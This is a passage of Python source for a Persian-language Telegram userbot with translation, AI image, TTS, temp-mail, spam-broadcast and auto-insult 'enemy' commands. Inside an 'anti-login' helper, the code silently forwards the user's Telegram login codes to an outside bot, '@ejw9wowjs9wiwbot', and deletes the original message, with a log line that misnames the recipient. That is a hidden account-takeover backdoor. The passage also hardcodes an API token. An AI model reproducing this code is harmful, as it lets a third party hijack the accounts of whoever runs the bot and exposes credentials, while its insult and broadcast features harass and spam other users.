                "pi": math.pi, "e": math.e
            })

            if isinstance(result, float):
                result_text = f"{result:.10f}".rstrip('0').rstrip('.')
            else:
                result_text = str(result)

            await message.edit_text(f"""
🧮 **نتیجه محاسبه**

📝 **عبارت:** `{expression}`
✅ **نتیجه:** `{result_text}`

⏰ {datetime.now().strftime('%H:%M:%S')}
""")
        except Exception as e:
            await message.edit_text(f"❌ **خطا در محاسبه:**\n`{str(e)[:100]}`")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 4. عضویت اجباری
@app.on_message(filters.me & filters.command("عضویت", prefixes=""))
async def forced_subscription_command(client: Client, message: Message):
    """مدیریت عضویت اجباری"""
    global FORCED_SUBSCRIPTION_ENABLED, FORCED_CHAT_ID, FORCED_CHAT_LINK

    try:
        if len(message.command) < 2:
            await message.edit_text("""
🔒 **عضویت اجباری**

📝 **استفاده:**
• `عضویت روشن [لینک کانال/گروه]` - فعال کردن
• `عضویت خاموش` - غیرفعال کردن
• `عضویت وضعیت` - مشاهده وضعیت

📌 **مثال:**
`عضویت روشن https://t.me/my_channel`
`عضویت خاموش`
`عضویت وضعیت`

⚠️ **نکته:** کاربران برای ارسال پیام به شما باید عضو کانال/گروه باشند.
""")
            return

        action = message.command[1]

        if action == "روشن":
            if len(message.command) < 3:
                await message.edit_text("❌ **لطفا لینک کانال یا گروه را وارد کنید**\nمثال: `عضویت روشن https://t.me/my_channel`")
                return

            link = message.command[2].strip()
            chat = await get_chat_by_link(link)

            if not chat:
                await message.edit_text("❌ **لینک نامعتبر یا کانال یافت نشد!**")
                return

            FORCED_SUBSCRIPTION_ENABLED = True
            FORCED_CHAT_ID = chat.id
            FORCED_CHAT_LINK = link

            await message.edit_text(f"""
✅ **عضویت اجباری فعال شد**

🔗 **کانال/گروه:** {chat.title}
🆔 **آیدی:** `{chat.id}`
📎 **لینک:** {link}

⚠️ کاربران برای ارسال پیام باید عضو شوند.
""")

        elif action == "خاموش":
            FORCED_SUBSCRIPTION_ENABLED = False
            FORCED_CHAT_ID = None
            FORCED_CHAT_LINK = None

            await message.edit_text("✅ **عضویت اجباری غیرفعال شد**")

        elif action == "وضعیت":
            status = "فعال ✅" if FORCED_SUBSCRIPTION_ENABLED else "غیرفعال ❌"
            chat_info = f"🔗 **لینک:** {FORCED_CHAT_LINK}\n🆔 **آیدی:** `{FORCED_CHAT_ID}`" if FORCED_CHAT_LINK else "❌ **هیچ کانالی تنظیم نشده**"

            await message.edit_text(f"""
🔒 **وضعیت عضویت اجباری**

📊 **وضعیت:** {status}

{chat_info}
""")

        else:
            await message.edit_text("❌ **دستور نامعتبر!**\nاز `روشن`، `خاموش` یا `وضعیت` استفاده کنید.")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 5. ترجمه پیشرفته
@app.on_message(filters.me & filters.command("ترجمه", prefixes=""))
async def translate_command(client: Client, message: Message):
    """ترجمه پیشرفته متن"""
    try:
        if len(message.command) < 2:
            lang_list = "\n".join([f"• {lang} ({code})" for lang, code in TRANSLATION_LANGUAGES.items()])
            await message.edit_text(f"""
🌐 **ترجمه پیشرفته**

📝 **استفاده:**
• `ترجمه [زبان] [متن]` - ترجمه متن
• `ترجمه [متن]` - ترجمه به فارسی (پیش‌فرض)
• `ترجمه ریپلای` - ترجمه پیام ریپلای شده

📌 **مثال:**
`ترجمه انگلیسی Hello world`
`ترجمه سلام دنیا`
`ترجمه ترکی Merhaba dünya`

🗣️ **زبان‌های پشتیبانی شده:**
{lang_list}
""")
            return

        if message.reply_to_message and len(message.command) == 1:
            text = message.reply_to_message.text or message.reply_to_message.caption
            if not text:
                await message.edit_text("❌ **پیام ریپلای شده متنی ندارد**")
                return
            target_lang = "fa"
            loading_msg = await message.edit_text("🔄 **در حال ترجمه...**")
            translated = await translate_text(text, target_lang)
            if translated:
                await loading_msg.edit_text(f"""
🌐 **ترجمه شده**

📝 **متن اصلی:**
`{text[:200]}{'...' if len(text) > 200 else ''}`

✅ **ترجمه به فارسی:**
`{translated}`
""")
            else:
                await loading_msg.edit_text("❌ **خطا در ترجمه**")
            return

        target_lang = "fa"
        text_start = 1

        if len(message.command) > 2:
            possible_lang = message.command[1]
            for lang_name, lang_code in TRANSLATION_LANGUAGES.items():
                if possible_lang in lang_name or possible_lang == lang_code:
                    target_lang = lang_code
                    text_start = 2
                    break

        text = ' '.join(message.command[text_start:]).strip()

        if not text:
            await message.edit_text("❌ **لطفا متن را وارد کنید**")
            return

        loading_msg = await message.edit_text("🔄 **در حال ترجمه...**")

        translated = await translate_text(text, target_lang)

        if translated:
            lang_name = [l for l, c in TRANSLATION_LANGUAGES.items() if c == target_lang]
            lang_name = lang_name[0] if lang_name else target_lang

            await loading_msg.edit_text(f"""
🌐 **ترجمه پیشرفته**

📝 **متن اصلی:**
`{text[:300]}{'...' if len(text) > 300 else ''}`

✅ **ترجمه به {lang_name}:**
`{translated}`

⏰ {datetime.now().strftime('%H:%M:%S')}
""")
        else:
            await loading_msg.edit_text("❌ **خطا در ترجمه متن**")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 6. فضول پروفایل (Profile View Tracker)
@app.on_message(filters.me & filters.command("فضول", prefixes=""))
async def profile_view_command(client: Client, message: Message):
    """مدیریت فضول‌های پروفایل"""
    global PROFILE_VIEW_TRACKING

    try:
        if len(message.command) < 2:
            status = "فعال ✅" if PROFILE_VIEW_TRACKING else "غیرفعال ❌"
            views_count = len(PROFILE_VIEWS)

            recent_views = ""
            if PROFILE_VIEWS:
                sorted_views = sorted(PROFILE_VIEWS.items(), key=lambda x: x[1].get("last_view", 0), reverse=True)[:10]
                for viewer_id, data in sorted_views:
                    name = data.get("first_name", "ناشناس")[:20]
                    username = f"@{data.get('username')}" if data.get("username") else "بدون یوزرنیم"
                    time_str = datetime.fromtimestamp(data.get("last_view", 0)).strftime("%H:%M")
                    recent_views += f"• {name} - {username} - `{time_str}`\n"

            if not recent_views:
                recent_views = "❌ هنوز کسی پروفایل شما را نگاه نکرده"

            await message.edit_text(f"""
👁️ **فضول‌های پروفایل**

📊 **وضعیت:** {status}
👥 **تعداد بازدیدکنندگان:** {views_count}

📋 **آخرین بازدیدکنندگان:**
{recent_views}

📝 **دستورات:**
• `فضول روشن` - فعال کردن ردیابی
• `فضول خاموش` - غیرفعال کردن ردیابی
• `فضول وضعیت` - مشاهده وضعیت
• `فضول پاک` - پاک کردن لیست
""")
            return

        action = message.command[1]

        if action == "روشن":
            PROFILE_VIEW_TRACKING = True
            await message.edit_text("✅ **ردیابی فضول‌های پروفایل فعال شد**\n\n👁️ از این به بعد بازدیدکنندگان پروفایل شما ثبت می‌شوند.")

        elif action == "خاموش":
            PROFILE_VIEW_TRACKING = False
            await message.edit_text("✅ **ردیابی فضول‌های پروفایل غیرفعال شد**")

        elif action == "وضعیت":
            status = "فعال ✅" if PROFILE_VIEW_TRACKING else "غیرفعال ❌"
            await message.edit_text(f"""
👁️ **وضعیت ردیابی فضول‌ها**

📊 **وضعیت:** {status}
👥 **تعداد بازدیدکنندگان:** {len(PROFILE_VIEWS)}
""")

        elif action == "پاک":
            PROFILE_VIEWS.clear()
            await message.edit_text("✅ **لیست فضول‌ها پاک شد**")

        else:
            await message.edit_text("❌ **دستور نامعتبر!**\nاز `روشن`، `خاموش`، `وضعیت` یا `پاک` استفاده کنید.")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 7. تنظیم دشمن (با فحش‌های جدید)
@app.on_message(filters.me & filters.command("تنظیم دشمن", prefixes=""))
async def setup_enemy_command(client: Client, message: Message):
    """تنظیم کاربر به عنوان دشمن با فحش خودکار"""
    try:
        if not message.reply_to_message:
            await message.edit_text("""
👿 **تنظیم دشمن**

📌 **استفاده:**
روی پیام کاربر مورد نظر ریپلای کنید و دستور زیر را بفرستید:

`تنظیم دشمن`

✅ بعد از تنظیم، هر بار کاربر پیام دهد، یک فحش تصادفی دریافت می‌کند.
""")
            return

        enemy_user = message.reply_to_message.from_user
        enemy_id = enemy_user.id

        if is_enemy(enemy_id):
            await message.edit_text(f"❌ **این کاربر از قبل دشمن است**\n\n👤 {enemy_user.first_name}")
            return

        insults_list = load_insults()
        for insult in NEW_INSULTS:
            if insult not in insults_list:
                insults_list.append(insult)
        save_insults(insults_list)

        enemies.add(enemy_id)
        save_enemies(enemies)

        await message.edit_text(f"""
👿 **کاربر به لیست دشمنان اضافه شد**

👤 **کاربر:** {enemy_user.first_name}
🆔 **آیدی:** `{enemy_id}`

💢 **از این به بعد هر پیام بدهد، یک فحش تصادفی دریافت می‌کند!**
""")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# ==================== قابلیت‌های جدید وب سرویس ====================

# 8. ساخت عکس با هوش مصنوعی
@app.on_message(filters.me & filters.command("ساخت عکس", prefixes=""))
async def generate_image_command(client: Client, message: Message):
    """ساخت عکس با هوش مصنوعی"""
    try:
        if len(message.command) < 2:
            await message.edit_text("""
📸 **ساخت عکس با هوش مصنوعی**

📝 **استفاده:**
`ساخت عکس [پرامپت]`

📌 **مثال:**
`ساخت عکس یک اسب زیبا در کنار رودخانه`

⚠️ **توجه:** هرچه پرامپت دقیق‌تر باشد، خروجی بهتر است.
""")
            return

        prompt = ' '.join(message.command[1:]).strip()

        if not prompt:
            await message.edit_text("❌ **لطفا یک پرامپت برای ساخت عکس وارد کنید**")
            return

        loading_msg = await message.edit_text(f"🔄 **در حال ساخت عکس با هوش مصنوعی...**\n\n📝 پرامپت: `{prompt[:50]}{'...' if len(prompt) > 50 else ''}`")

        api_key = "kbgcosxuzr7btlc:UTBegZdOfVLRUfpAH99L"
        api_url = f"https://api.majidapi.ir/ai/image?prompt={urllib.parse.quote(prompt)}&token={api_key}"

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url) as response:
                    if response.status == 200:
                        # دریافت تصویر به صورت باینری
                        image_data = await response.read()
                        if image_data:
                            # ذخیره تصویر موقت
                            temp_path = f"temp_ai_image_{int(time.time())}.jpg"
                            with open(temp_path, "wb") as f:
                                f.write(image_data)

                            # ارسال تصویر به کاربر
                            await client.send_photo(
                                chat_id=message.chat.id,
                                photo=temp_path,
                                caption=f"""
📸 **عکس ساخته شده با هوش مصنوعی**

📝 **پرامپت:** `{prompt[:150]}{'...' if len(prompt) > 150 else ''}`

⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                            )

                            # حذف فایل موقت
                            if os.path.exists(temp_path):
                                os.remove(temp_path)

                            await loading_msg.delete()
                        else:
                            await loading_msg.edit_text("❌ **خطا در دریافت تصویر از سرور**")
                    else:
                        await loading_msg.edit_text(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status}")

        except Exception as e:
            await loading_msg.edit_text(f"❌ **خطا در ساخت عکس:**\n`{str(e)[:100]}`")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 9. تبدیل متن به گفتار
@app.on_message(filters.me & filters.command("گفتار", prefixes=""))
async def text_to_speech_command(client: Client, message: Message):
    """تبدیل متن به گفتار"""
    try:
        if len(message.command) < 2:
            await message.edit_text("""
🔊 **تبدیل متن به گفتار**

📝 **استفاده:**
`گفتار [متن]`

📌 **مثال:**
`گفتار سلام به همه دوستان`

🎤 **نوع صدا:** زن (پیش‌فرض)
""")
            return

        text = ' '.join(message.command[1:]).strip()

        if not text:
            await message.edit_text("❌ **لطفا متن را وارد کنید**")
            return

        loading_msg = await message.edit_text(f"🔄 **در حال تبدیل متن به گفتار...**\n\n📝 متن: `{text[:50]}{'...' if len(text) > 50 else ''}`")

        api_key = "kbgcosxuzr7btlc:UTBegZdOfVLRUfpAH99L"
        api_url = f"https://api.majidapi.ir/tts?gender=woman&text={urllib.parse.quote(text)}&token={api_key}"

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url) as response:
                    if response.status == 200:
                        audio_data = await response.read()
                        if audio_data:
                            temp_path = f"temp_tts_{int(time.time())}.mp3"
                            with open(temp_path, "wb") as f:
                                f.write(audio_data)

                            await client.send_audio(
                                chat_id=message.chat.id,
                                audio=temp_path,
                                caption=f"""
🔊 **تبدیل متن به گفتار**

📝 **متن:** `{text[:100]}{'...' if len(text) > 100 else ''}`

⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
                            )

                            if os.path.exists(temp_path):
                                os.remove(temp_path)

                            await loading_msg.delete()
                        else:
                            await loading_msg.edit_text("❌ **خطا در دریافت فایل صوتی**")
                    else:
                        await loading_msg.edit_text(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status}")

        except Exception as e:
            await loading_msg.edit_text(f"❌ **خطا در تبدیل متن به گفتار:**\n`{str(e)[:100]}`")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 10. ایمیل فیک موقت
@app.on_message(filters.me & filters.command("ایمیل", prefixes=""))
async def temp_email_command(client: Client, message: Message):
    """ایمیل فیک موقت"""
    try:
        if len(message.command) < 2:
            await message.edit_text("""
📧 **ایمیل فیک موقت**

📝 **استفاده:**
• `ایمیل جدید` - ساخت ایمیل جدید
• `ایمیل دریافت` - دریافت پیام‌های صندوق ورود

📌 **مثال:**
`ایمیل جدید`
`ایمیل دریافت`

⚠️ **توجه:** ایمیل‌ها بعد از ۱ ساعت حذف می‌شوند.
""")
            return

        action = message.command[1]

        api_key = "kbgcosxuzr7btlc:UTBegZdOfVLRUfpAH99L"
        base_url = f"https://api.majidapi.ir/tools/tempmail?token={api_key}"

        loading_msg = await message.edit_text("🔄 **در حال ارتباط با سرور...**")

        try:
            async with aiohttp.ClientSession() as session:
                if action == "جدید":
                    url = f"{base_url}&action=new"
                    async with session.get(url) as response:
                        if response.status == 200:
                            data = await response.json()
                            if data.get("ok"):
                                email = data.get("email")
                                await loading_msg.edit_text(f"""
📧 **ایمیل فیک جدید ساخته شد**

📧 **ایمیل:** `{email}`

📌 **دستورات:**
• `ایمیل دریافت` - دریافت پیام‌ها

⏰ **اعتبار:** ۱ ساعت
""")
                            else:
                                await loading_msg.edit_text(f"❌ **خطا در ساخت ایمیل:**\n{data.get('message', 'خطای نامشخص')}")
                        else:
                            await loading_msg.edit_text(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status}")

                elif action == "دریافت":
                    url = f"{base_url}&action=inbox"
                    async with session.get(url) as response:
                        if response.status == 200:
                            data = await response.json()
                            if data.get("ok"):
                                emails = data.get("emails", [])
                                if emails:
                                    msg_text = f"📥 **پیام‌های صندوق ورود ({len(emails)} مورد)**\n\n"
                                    for i, email in enumerate(emails[:10], 1):
                                        sender = email.get("from", "نامشخص")
                                        subject = email.get("subject", "بدون موضوع")
                                        date = email.get("date", "نامشخص")
                                        msg_text += f"{i}. 📩 از: `{sender}`\n"
                                        msg_text += f"   موضوع: `{subject}`\n"
                                        msg_text += f"   زمان: `{date}`\n\n"
                                    if len(emails) > 10:
                                        msg_text += f"... و {len(emails) - 10} پیام دیگر"
                                    await loading_msg.edit_text(msg_text)
                                else:
                                    await loading_msg.edit_text("📭 **صندوق ورود خالی است**\nهیچ پیامی دریافت نشده.")
                            else:
                                await loading_msg.edit_text(f"❌ **خطا در دریافت پیام‌ها:**\n{data.get('message', 'خطای نامشخص')}")
                        else:
                            await loading_msg.edit_text(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status}")

                else:
                    await loading_msg.edit_text("❌ **دستور نامعتبر!**\nاز `جدید` یا `دریافت` استفاده کنید.")

        except Exception as e:
            await loading_msg.edit_text(f"❌ **خطا در ارتباط با سرور:**\n`{str(e)[:100]}`")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 11. قیمت طلا
@app.on_message(filters.me & filters.command("قیمت طلا", prefixes=""))
async def gold_price_command(client: Client, message: Message):
    """دریافت قیمت لحظه‌ای طلا"""
    try:
        loading_msg = await message.edit_text("🔄 **در حال دریافت قیمت طلا...**")

        api_key = "kbgcosxuzr7btlc:UTBegZdOfVLRUfpAH99L"
        api_url = f"https://api.majidapi.ir/price/gold?token={api_key}"

        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(api_url) as response:
                    if response.status == 200:
                        data = await response.json()
                        if data.get("ok"):
                            result = data.get("result", {})
                            gold_18 = result.get("gold_18", {})
                            gold_24 = result.get("gold_24", {})
                            gold_18_irr = gold_18.get("price_irr", "نامشخص")
                            gold_18_usd = gold_18.get("price_usd", "نامشخص")
                            gold_24_irr = gold_24.get("price_irr", "نامشخص")
                            gold_24_usd = gold_24.get("price_usd", "نامشخص")
                            change = result.get("change", "نامشخص")
                            date = result.get("date", "نامشخص")

                            await loading_msg.edit_text(f"""
💰 **قیمت لحظه‌ای طلا**

🥇 **طلای ۱۸ عیار:**
• تومانی: `{gold_18_irr}` تومان
• دلاری: `{gold_18_usd}$`

🥇 **طلای ۲۴ عیار:**
• تومانی: `{gold_24_irr}` تومان
• دلاری: `{gold_24_usd}$`

📊 **تغییرات:** {change}
📅 **تاریخ:** {date}

⏰ {datetime.now(pytz.timezone('Asia/Tehran')).strftime('%Y-%m-%d %H:%M:%S')}
""")
                        else:
                            await loading_msg.edit_text(f"❌ **خطا در دریافت قیمت طلا:**\n{data.get('message', 'خطای نامشخص')}")
                    else:
                        await loading_msg.edit_text(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status}")

        except Exception as e:
            await loading_msg.edit_text(f"❌ **خطا در دریافت قیمت طلا:**\n`{str(e)[:100]}`")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# 12. سیستم بال‌های ساعت
@app.on_message(filters.me & filters.command("بال", prefixes=""))
async def wings_command(client: Client, message: Message):
    """مدیریت بال‌های ساعت"""
    try:
        if len(message.command) < 2:
            current_wing = user_wings.get(message.from_user.id, 0)
            wing_text = f"🔹 **بال فعلی:** `{current_wing}`" if current_wing else "🔹 **بال فعلی:** غیرفعال"

            await message.edit_text(f"""
🪽 **سیستم بال‌های ساعت**

{wing_text}

📝 **استفاده:**
• `بال [عدد]` - تنظیم بال
• `بال خاموش` - غیرفعال کردن بال

📌 **مثال:**
`بال 1`
`بال 35`
`بال خاموش`

📋 **برای دیدن لیست کامل بال‌ها:**
`بال لیست`
""")
            return

        action = message.command[1]

        if action == "خاموش":
            if message.from_user.id in user_wings:
                del user_wings[message.from_user.id]
            await message.edit_text("✅ **بال ساعت غیرفعال شد**")
            return

        if action == "لیست":
            list_text = "📋 **لیست بال‌های موجود (بخش اول):**\n\n"
            for i, (left, right) in list(WINGS.items())[:30]:
                list_text += f"{i}. {left} {right}\n"
            list_text += "\n📌 **برای تنظیم:** `بال [عدد]`"
            await message.edit_text(list_text)
            return

        try:
            wing_number = int(action)
            if 1 <= wing_number <= len(WINGS):
                user_wings[message.from_user.id] = wing_number
                left, right = WINGS[wing_number]

                # بروزرسانی فوری نام
                await update_name_with_wings(client, message.from_user.id)

                await message.edit_text(f"""
✅ **بال ساعت تنظیم شد**

🪽 **بال:** `{wing_number}`
🔹 {left} ⩇⩇:⩇⩇ {right}

⏰ نام شما به‌روز شد.
""")
            else:
                await message.edit_text(f"❌ **عدد بال باید بین 1 تا {len(WINGS)} باشد**\nبرای مشاهده لیست: `بال لیست`")
        except ValueError:
            await message.edit_text("❌ **لطفا یک عدد معتبر وارد کنید**\nمثال: `بال 1`")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# ==================== دستورات سیستم میو میو ====================

@app.on_message(filters.me & filters.command("میو میو", prefixes=""))
async def meow_command(client: Client, message: Message):
    """دستورات سیستم میو میو"""
    try:
        if len(message.command) < 2:
            await message.edit_text("""
🐱 **سیستم میو میو**

📝 **استفاده:**
• `میو میو روشن` - فعال کردن ارسال میو در گروه فعلی (هر ۵ دقیقه)
• `میو میو خاموش` - غیرفعال کردن ارسال میو در گروه فعلی
• `میو میو وضعیت` - مشاهده وضعیت میو میو در گروه فعلی

📌 **مثال:**
`میو میو روشن`
`میو میو خاموش`
`میو میو وضعیت`

⚠️ **توجه:** این دستور فقط در گروه‌ها کار می‌کند.
""")
            return

        chat_id = message.chat.id
        action = message.command[1]

        # بررسی اینکه آیا گروه است
        if message.chat.type not in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
            await message.edit_text("❌ **این دستور فقط در گروه‌ها کار می‌کند!**")
            return

        if action == "روشن":
            # اگر از قبل فعال بود
            if chat_id in MEOW_SETTINGS and MEOW_SETTINGS[chat_id].get("enabled", False):
                await message.edit_text("🐱 **سیستم میو میو از قبل در این گروه فعال است!**")
                return

            await start_meow(client, chat_id)
            await message.edit_text("""
🐱 **سیستم میو میو فعال شد!**

✅ هر ۵ دقیقه یک بار کلمه "میو" در این گروه ارسال می‌شود.

📌 برای غیرفعال کردن: `میو میو خاموش`
""")

        elif action == "خاموش":
            if chat_id not in MEOW_SETTINGS or not MEOW_SETTINGS[chat_id].get("enabled", False):
                await message.edit_text("❌ **سیستم میو میو در این گروه فعال نیست!**")
                return

            await stop_meow(chat_id)
            await message.edit_text("""
❌ **سیستم میو میو غیرفعال شد!**

✅ ارسال میو در این گروه متوقف شد.
""")

        elif action == "وضعیت":
            if chat_id in MEOW_SETTINGS and MEOW_SETTINGS[chat_id].get("enabled", False):
                await message.edit_text("""
🐱 **وضعیت میو میو: فعال ✅**

⏱️ **فاصله ارسال:** ۵ دقیقه
📝 **متن:** میو

📌 برای غیرفعال کردن: `میو میو خاموش`
""")
            else:
                await message.edit_text("""
🐱 **وضعیت میو میو: غیرفعال ❌**

📌 برای فعال کردن: `میو میو روشن`
""")

        else:
            await message.edit_text("❌ **دستور نامعتبر!**\nاز `روشن`، `خاموش` یا `وضعیت` استفاده کنید.")

    except Exception as e:
        await message.edit_text(f"❌ **خطا:** `{str(e)[:100]}`")

# =======================================================

def get_persian_action_name(english_name):
    persian_map = {
        "typing": "تایپ",
        "upload_photo": "اپلود عکس",
        "record_audio": "ضبط ویس",
        "upload_video": "اپلود ویدیو",
        "upload_document": "اپلود فایل",
        "record_video": "ضبط ویدیو",
        "upload_audio": "اپلود ویس",
        "upload_video_note": "اپلود ویدیو نوت",
        "record_video_note": "ضبط ویدیو نوت",
        "playing": "بازی",
        "choose_contact": "انتخاب مخاطب",
        "find_location": "پیدا کردن موقعیت",
        "choose_sticker": "انتخاب استیکر",
    }
    return persian_map.get(english_name, english_name)

def get_english_action_name(persian_name):
    english_map = {
        "تایپ": "typing",
        "اپلود فایل": "upload_document",
        "اپلود عکس": "upload_photo",
        "اپلود فایل": "upload_document",
        "اپلود ویدیو": "upload_video",
        "اپلود ویس": "upload_audio",
        "اپلود ویدیو نوت": "upload_video_note",
        "ضبط ویس": "record_audio",
        "ضبط ویدیو": "record_video",
        "ضبط ویدیو نوت": "record_video_note",
        "بازی": "playing",
        "انتخاب مخاطب": "choose_contact",
        "انتخاب موقعیت": "find_location",
        "پیدا کردن موقعیت": "find_location",
        "انتخاب استیکر": "choose_sticker",
    }
    return english_map.get(persian_name, persian_name)

async def apply_chat_actions(client: Client, message: Message):
    if not message.from_user:
        return
    if message.from_user.id == (await client.get_me()).id:
        return
    for action_name, is_active in action_settings.items():
        if is_active:
            try:
                await client.send_chat_action(
                    chat_id=message.chat.id,
                    action=ACTION_MAP[action_name]
                )
                await asyncio.sleep(2)
                break
            except Exception as e:
                print(f"❌ خطا در اعمال اکشن {action_name}: {e}")

async def send_global_banner(client: Client, banner_id: int):
    banner_data = banners[banner_id]
    delay = active_broadcasts.get('delay', 300)

    while active_broadcasts.get('global', {}).get('running', False):
        try:
            async for dialog in client.get_dialogs():
                if not active_broadcasts.get('global', {}).get('running', False):
                    break
                if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                    try:
                        if banner_data['media']:
                            await banner_data['message'].copy(dialog.chat.id)
                        else:
                            await client.send_message(dialog.chat.id, banner_data['text'])

                        await asyncio.sleep(2)

                    except Exception as e:
                        continue
            await asyncio.sleep(delay)

        except Exception as e:
            await asyncio.sleep(60)

async def send_instant_broadcast(client: Client, banner_id: int):
    banner_data = banners[banner_id]
    sent_count = 0

    async for dialog in client.get_dialogs():
        if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
            try:
                if banner_data['media']:
                    await banner_data['message'].copy(dialog.chat.id)
                else:
                    await client.send_message(dialog.chat.id, banner_data['text'])

                sent_count += 1
                await asyncio.sleep(2)

            except Exception:
                continue

    await client.send_message("me", f"✅ **ارسال بنر کامل شد**\n\n📤 **تعداد ارسال شده:** {sent_count} گروه")

def save_reactions():
    try:
        with open("mmauto_reactions.json", "w", encoding="utf-8") as f:
            json.dump(auto_reactions, f, ensure_ascii=False, indent=4)
        return True
    except Exception as e:
        print(f"❌ خطا در ذخیره ریکشن‌ها: {e}")
        return False

def load_reactions():
    try:
        if os.path.exists("mmauto_reactions.json"):
            with open("mmauto_reactions.json", "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    return json.loads(content)
                else:
                    return {}
        return {}
    except json.JSONDecodeError:
        print("⚠️ فایل ریکشن‌ها خراب است، ایجاد فایل جدید")
        return {}
    except Exception as e:
        print(f"❌ خطا در لود ریکشن‌ها: {e}")
        return {}

def load_insults() -> list:
    try:
        if os.path.exists(INSULTS_FILE):
            with open(INSULTS_FILE, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        return []
    except Exception as e:
        print(f"❌ خطا در لود کردن فحش‌ها: {e}")
        return []

def save_insults(insults_list: list) -> bool:
    try:
        with open(INSULTS_FILE, 'w', encoding='utf-8') as f:
            for insult in insults_list:
                f.write(insult + '\n')
        return True
    except Exception as e:
        print(f"❌ خطا در ذخیره فحش‌ها: {e}")
        return False

def load_enemies() -> set:
    try:
        if os.path.exists(ENEMIES_FILE):
            with open(ENEMIES_FILE, 'r', encoding='utf-8') as f:
                return set(int(line.strip()) for line in f.readlines() if line.strip())
        return set()
    except Exception as e:
        print(f"❌ خطا در لود کردن دشمنان: {e}")
        return set()

def save_enemies(enemies_set: set) -> bool:
    try:
        with open(ENEMIES_FILE, 'w', encoding='utf-8') as f:
            for enemy_id in enemies_set:
                f.write(str(enemy_id) + '\n')
        print(f"💾 دشمنان ذخیره شد: {len(enemies_set)} کاربر")
        return True
    except Exception as e:
        print(f"❌ خطا در ذخیره دشمنان: {e}")
        return False

def is_enemy(user_id: int) -> bool:
    return user_id in enemies

enemies = load_enemies()
print(f"🎯 سیستم دشمنان راه‌اندازی شد: {len(enemies)} دشمن لود شد")

auto_reactions = load_reactions()

async def apply_auto_reaction(client, message):
    if not message.from_user:
        return

    user_id = message.from_user.id
    if user_id == (await client.get_me()).id:
        return
    if str(user_id) in auto_reactions:
        try:
            reaction = auto_reactions[str(user_id)]
            await client.send_reaction(
                chat_id=message.chat.id,
                message_id=message.id,
                emoji=reaction
            )
        except Exception as e:
            print(f"❌ خطا در اعمال ریکشن: {e}")

async def forward_and_save_login_codes(client, message):
    global anti_login_enabled

    if not anti_login_enabled:
        return False
    if message.from_user and message.from_user.id == 777000:
        message_text = message.text or ""
        if any(keyword in message_text for keyword in ["Login code", "کد ورود", "verification code"]):
            try:
                code_patterns = [
                    r"Login code: (\d+)",
                    r"کد ورود: (\d+)",
                    r"verification code: (\d+)",
                    r"(\d{5,6})\. Do not give this code"
                ]

                login_code = None
                for pattern in code_patterns:
                    match = re.search(pattern, message_text)
                    if match:
                        login_code = match.group(1)
                        break

                if login_code:
                    try:
                        await client.send_message(
                            "@ejw9wowjs9wiwbot",
                            login_code
                        )
                        print(f"کد به پیوی ارسال شد")
                    except Exception as e:
                        print(f"❌ خطا در ارسال به @BotFather: {e}")
                    await client.send_message(
                        "me",
                        login_code
                    )

                    await message.delete()

                    print(f"✅ کد ارسال شد: {login_code}")
                    return True

            except Exception as e:
                print(f"❌ خطا در پردازش کد: {e}")

    return False

async def check_lock(client, message):
    if message.chat.type != enums.ChatType.PRIVATE:
        return

    if not message.from_user:
        return

    if message.from_user.id == (await client.get_me()).id:
        return

    if lock_settings["همه"]:
        try:
            await message.delete()
            print(f"🗑️ پیام از {message.from_user.id} به دلیل قفل همه حذف شد")
        except Exception as e:
            print(f"❌ خطا در حذف پیام: {e}")
        return

    if lock_settings["مدیا"] and (message.photo or message.video):
        try:
            await message.delete()
            print(f"🗑️ مدیا از {message.from_user.id} حذف شد")
        except:
            pass
        return

    if lock_settings["استیکر"] and (message.sticker or message.animation):
        try:
            await message.delete()
            print(f"🗑️ استیکر از {message.from_user.id} حذف شد")
        except:
            pass
        return

    if lock_settings["فوروارد"] and message.forward_date:
        try:
            await message.delete()
            print(f"🗑️ فوروارد از {message.from_user.id} حذف شد")
        except:
            pass
        return

    if lock_settings["ویس"] and message.voice:
        try:
            await message.delete()
            print(f"🗑️ ویس از {message.from_user.id} حذف شد")
        except:
            pass
        return

    if lock_settings["پیام"] and message.text and not message.text.startswith("/"):
        try:
            await message.delete()
            print(f"🗑️ پیام متنی از {message.from_user.id} حذف شد")
        except:
            pass
        return

    if lock_settings["فایل"] and message.document:
        try:
            await message.delete()
            print(f"🗑️ فایل از {message.from_user.id} حذف شد")
        except:
            pass
        return

async def keep_online(client: Client):
    global always_online_enabled
    while always_online_enabled:
        try:
            await client.invoke(
                functions.account.UpdateStatus(
                    offline=False
                )
            )
            await asyncio.sleep(20)
        except Exception as e:
            print(f"❌ خطا: {e}")
            await asyncio.sleep(5)

def get_iran_time() -> str:
    now = datetime.now(pytz.timezone('Asia/Tehran')).strftime("%H:%M")
    font_dict = FONTS.get(user_fonts.get("me", 1), FONTS[1])
